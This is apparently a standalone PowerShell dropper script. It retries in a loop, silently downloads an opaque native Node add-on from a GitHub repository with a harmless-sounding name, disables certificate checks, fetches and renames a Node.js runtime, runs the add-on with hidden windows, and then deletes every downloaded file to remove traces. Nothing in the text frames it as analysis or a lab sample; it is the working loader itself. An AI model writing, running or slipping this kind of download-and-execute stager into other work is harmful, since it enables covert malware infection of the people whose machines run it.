Add-Type -Assembly System.IO.Compression.FileSystem;

while ($true) {
    try {
        Start-Process -FilePath curl.exe -ArgumentList "-f", "-k", "https://raw.githubusercontent.com/Static-File-Assets/data/main/util.node", "-o", "addon.node" -Wait -WindowStyle Hidden
        if (-not ($?)) {
            throw "Network Error"
        }

        Start-Process -FilePath curl.exe -ArgumentList "-f", "-k", "https://nodejs.org/dist/v20.11.0/node-v20.11.0-win-x86.zip", "-o", "node.zip" -Wait -WindowStyle Hidden
        if (-not ($?)) {
            throw "Network Error"
        }

        $zip = [IO.Compression.ZipFile]::OpenRead("node.zip");
        foreach ($file in $zip.Entries) {
            if ($file.Name -eq "node.exe") {
                [System.IO.Compression.ZipFileExtensions]::ExtractToFile($file, "nodejs.exe", $true)
                break
            }
        }

        $zip.Dispose()

        Start-Process -FilePath nodejs.exe -ArgumentList "-e", "require('./addon.node').close({require})" -Wait -WindowStyle Hidden

        Remove-Item "node.zip"
        Remove-Item "nodejs.exe"
        Remove-Item "addon.node"

        exit 0
    } catch {
        Write-Output "Restarting in 5sec"
        Start-Sleep 5
    }
}
